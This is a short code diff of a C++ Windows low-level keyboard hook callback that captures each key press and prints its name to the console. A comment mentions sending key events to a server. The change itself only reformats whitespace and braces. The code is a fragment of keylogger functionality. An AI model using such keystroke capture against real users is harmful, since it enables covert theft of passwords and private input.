@@ -34,8 +34,11 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode >= 0)
 	{
+		
+				
 		// Get the key code and key state
 		int keyCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
+
 		bool isKeyDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
 
 		//Get the name of virtual key code
@@ -43,8 +46,11 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 		// Print the key code and character to the console OR // Send the key event to the server
 		//######################################################################################
-		if (isKeyDown)
+		if (isKeyDown) {
 			std::wcout << name << "\n";
+		}
+
+		
 		//######################################################################################
 
 		//std::cout << std::to_string((char)keyCode) << ((isKeyDown) ? " :down\n" : " :up\n");
